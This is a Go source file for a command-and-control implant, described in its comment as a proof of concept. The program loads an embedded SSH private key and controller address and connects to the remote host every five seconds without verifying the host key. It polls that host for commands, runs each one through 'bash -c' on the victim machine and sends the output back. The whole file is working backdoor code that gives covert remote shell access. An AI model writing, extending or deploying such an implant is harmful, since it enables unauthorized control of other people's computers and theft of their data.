// Heavily borrowed code for proof of concept, will be changing
package main

import (
	"flag"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"time"

	"os/user"

	"github.com/0x42red/command_control/pkg/embeddata"
	"github.com/melbahja/goph"
	"golang.org/x/crypto/ssh"
)

var (
	addr    string
	port    uint
	timeout time.Duration
)

func init() {
	config, err := embeddata.GetConfig()
	if err != nil {
		log.Fatal(err)
	}
	flag.StringVar(&addr, "ip", config.Host, "machine ip address.")
	flag.UintVar(&port, "port", uint(config.Port), "ssh port number.")
	flag.DurationVar(&timeout, "timeout", 0, "interrupt a command with SIGINT after a given timeout (0 means no timeout)")
}

func VerifyHost(host string, remote net.Addr, key ssh.PublicKey) error {
	return nil
}

func main() {
	flag.Parse()

	var err error

	signer, err := embeddata.GetPrivateKey()
	if err != nil {
		panic(err)
	}

	auth := goph.Auth{
		ssh.PublicKeys(signer),
	}

	currentUser, err := user.Current()
	if err != nil {
		log.Println(err)
		currentUser = &user.User{
			Username: "missing",
		}
	}

	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt)
	ticker := time.NewTicker(5000 * time.Millisecond)
	for {
		select {
		case <-c:
			log.Println("Killing process...")
			return
		case <-ticker.C:
			err = foo(auth, currentUser)
			if err != nil {
				log.Println(err)
			}

			log.Println("Waiting 5 seconds...")
		}
	}
}

func foo(auth goph.Auth, currentUser *user.User) error {
	client, err := goph.NewConn(&goph.Config{
		User:     currentUser.Username,
		Addr:     addr,
		Port:     port,
		Auth:     auth,
		Callback: VerifyHost,
	})
	if err != nil {
		log.Println("[-] Client conn error:", err)
		return err
	}
	defer client.Close()

	handleConnection(client)

	return nil
}

func handleConnection(client *goph.Client) {

	log.Printf("[+] Connected to %s:%d\n", client.Config.Addr, client.Config.Port)

	ticker := time.NewTicker(1000 * time.Millisecond)
	done := make(chan os.Signal, 1)
	signal.Notify(done, os.Interrupt)

	for {
		select {
		case <-done:
			log.Println("[-] Killing this client instance...")
			return
		case <-ticker.C:
			command, err := client.Command("POLL")
			if err != nil {
				log.Println("[-] Command poll error:", err)
				return
			}
			out, err := command.Output()
			if err != nil {
				log.Println("[-] Output poll error:", err)
				continue
			}
			if strings.TrimSpace(string(out)) != "" {
				log.Println("[+] Inbound command:", string(out), err)
				exec.Command("bash", "-c", string(out))

				out, err = exec.Command("bash", "-c", string(out)).CombinedOutput()
				if err != nil {
					log.Println("[-] Bash error:", err)
					out = append(out, []byte(err.Error())...)
				}

				command, err = client.Command(string(out))
				if err != nil {
					log.Println("[-] Client command error:", err)
					continue
				}
				out, err = command.CombinedOutput()
				if err != nil {
					log.Println("[-] Client output error:", err)
					continue
				}
				log.Println("[+] Client command output:", string(out), err)
			}
		}
	}
}
